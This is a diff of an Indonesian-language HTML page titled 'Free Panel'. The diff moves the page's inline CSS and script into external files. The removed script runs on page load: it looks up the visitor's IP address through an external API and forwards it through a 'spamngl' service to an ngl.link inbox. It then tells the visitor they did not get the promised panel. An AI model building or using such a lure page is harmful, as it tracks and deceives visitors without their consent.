@@ -4,58 +4,10 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Free Panel</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      color: white;
-      text-align: center;
-      padding: 100px 20px;
-    }
-    h2 {
-      font-size: 1.8em;
-      background: rgba(0, 0, 0, 0.2);
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.3);
-      display: inline-block;
-      max-width: 600px;
-    }
-    @keyframes fade {
-      0% { opacity: 0; transform: translateY(20px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    h2 {
-      animation: fade 1s ease-out;
-    }
-  </style>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <h2>Sedang mengirim request ke developer...</h2>
-
-  <script>
-    async function autoKirim() {
-      try {
-        const res = await fetch('https://api.betabotz.eu.org/ip');
-        const data = await res.json();
-
-        const pesan = `IP berhasil di temukan:\nIP: ${data.ip}`;
-        const encodedPesan = encodeURIComponent(pesan);
-
-        const nglUrl = `https://fastrestapis.fasturl.cloud/tool/spamngl?link=https://ngl.link/vinzz_official&message=${encodedPesan}&type=anonymous&count=1`;
-
-        const send = await fetch(nglUrl);
-        if (send.ok) {
-          document.body.innerHTML = '<h2>Yah sayang broo gk dapet panelnya.<br><small>by Vinzz Official</small></h2>';
-        } else {
-          document.body.innerHTML = '<h2>Terjadi kesalahan saat mengirim request ke developer</h2>';
-        }
-      } catch (err) {
-        console.error(err);
-        document.body.innerHTML = '<h2>Terjadi error saat mengirim.</h2>';
-      }
-    }
-    autoKirim();
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
